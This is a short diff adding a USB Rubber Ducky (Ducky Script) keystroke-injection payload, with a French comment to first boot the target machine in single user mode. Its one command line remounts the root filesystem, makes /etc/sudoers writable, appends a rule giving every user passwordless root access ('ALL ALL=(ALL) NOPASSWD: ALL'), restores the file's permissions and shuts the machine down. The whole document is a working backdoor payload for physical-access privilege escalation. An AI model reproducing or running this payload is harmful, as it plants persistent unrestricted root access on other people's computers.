@@ -1,0 +1,4 @@
+REM	###	Lance d'abord la machine en single user mode
+DELAY 1000
+STRING mount -uw / && chmod 755 /etc/sudoers && echo 'ALL    ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && chmod 440 /etc/sudoers && shutdown -h now
+ENTER
